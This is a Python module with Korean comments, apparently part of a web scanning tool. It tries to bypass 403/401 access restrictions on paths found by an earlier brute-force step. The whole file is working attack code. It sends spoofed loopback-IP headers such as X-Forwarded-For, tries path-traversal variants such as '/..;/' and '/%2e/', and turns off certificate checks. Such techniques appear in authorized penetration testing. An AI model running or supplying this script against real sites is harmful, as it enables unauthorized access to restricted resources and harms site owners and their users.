import requests
from rich.console import Console

console = Console()

class AccessBypass:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.bypass_headers = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Originating-IP": "127.0.0.1"},
            {"X-Remote-IP": "127.0.0.1"},
            {"X-Remote-Addr": "127.0.0.1"},
            {"X-Client-IP": "127.0.0.1"},
            {"X-Host": "127.0.0.1"},
            {"X-Forwarded-Host": "localhost"}
        ]
        self.bypass_paths = [
            "/./", "/%2e/", "/index.php/..;", "/..;/", "/static/..;/"
        ]

    def run_bypass(self, path):
        """403/401이 발생하는 경로에 대해 우회 시도"""
        results = []
        base_target = f"{self.target_url}{path}"
        
        # 1. 헤더 기반 우회
        for header in self.bypass_headers:
            try:
                res = requests.get(base_target, headers=header, timeout=5, verify=False)
                if res.status_code == 200:
                    results.append({"type": "403 Bypass (Header)", "url": base_target, "payload": str(header)})
            except: pass

        # 2. 경로 변조 기반 우회
        for b_path in self.bypass_paths:
            test_url = f"{self.target_url}{b_path}{path.lstrip('/')}"
            try:
                res = requests.get(test_url, timeout=5, verify=False)
                if res.status_code == 200:
                    results.append({"type": "403 Bypass (Path)", "url": test_url, "payload": b_path})
            except: pass
            
        return results

def run_access_bypass(live_hosts, found_paths):
    # 브루트포스에서 403이나 401이 뜬 경로들만 추출
    targets = [p for p in found_paths if p['status'] in [403, 401]]
    if not targets: return []
    
    console.print(f"[bold blue][*][/bold blue] Attempting Access Control Bypass on {len(targets)} restricted paths...")
    all_bypass = []
    for t in targets:
        # URL에서 호스트와 경로 분리
        from urllib.parse import urlparse
        parsed = urlparse(t['url'])
        host_url = f"{parsed.scheme}://{parsed.netloc}"
        path = parsed.path
        
        bypass = AccessBypass(host_url)
        all_bypass.extend(bypass.run_bypass(path))
    
    return all_bypass
